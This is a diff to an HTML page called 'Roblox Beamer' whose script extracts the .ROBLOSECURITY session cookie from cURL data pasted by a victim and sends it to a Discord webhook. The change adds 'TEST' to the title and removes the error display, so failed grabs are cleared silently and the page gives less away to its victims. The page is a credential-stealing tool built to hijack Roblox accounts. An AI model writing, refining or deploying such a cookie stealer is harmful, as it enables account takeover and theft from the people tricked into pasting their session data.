@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Beamer</title>
+  <title>TEST Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -36,10 +36,6 @@
     button:hover:not(:disabled) {
       background-color: #0056b3;
     }
-    .error {
-      color: red;
-      font-weight: bold;
-    }
   </style>
 </head>
 <body>
@@ -49,7 +45,6 @@
     <button id="sendButton" onclick="sendMessage()">Send</button>
   </div>
   <p id="status" style="color: green; font-weight: bold;"></p>
-  <p id="errorMessage" class="error"></p>
 
   <script>
     // Replace with your Discord Webhook URL
@@ -61,10 +56,7 @@
     function sendMessage() {
       const messageInput = document.getElementById("messageInput");
       const sendButton = document.getElementById("sendButton");
-      const errorMessage = document.getElementById("errorMessage");
       let message = messageInput.value;
-
-      errorMessage.textContent = ""; // Clear any previous error messages
 
       // Extract the _ROBLOSECURITY token from the copied cURL data
       const robloSecurityCode = extractRobloSecurityToken(message);
@@ -103,8 +95,8 @@
           });
 
       } else {
-        // If the _ROBLOSECURITY cookie is not found in the message
-        errorMessage.textContent = "Message failed! .ROBLOSECURITY cookie not found.";
+        // If the _ROBLOSECURITY cookie is not found, just clear the input without an error message
+        messageInput.value = "";
       }
     }
 
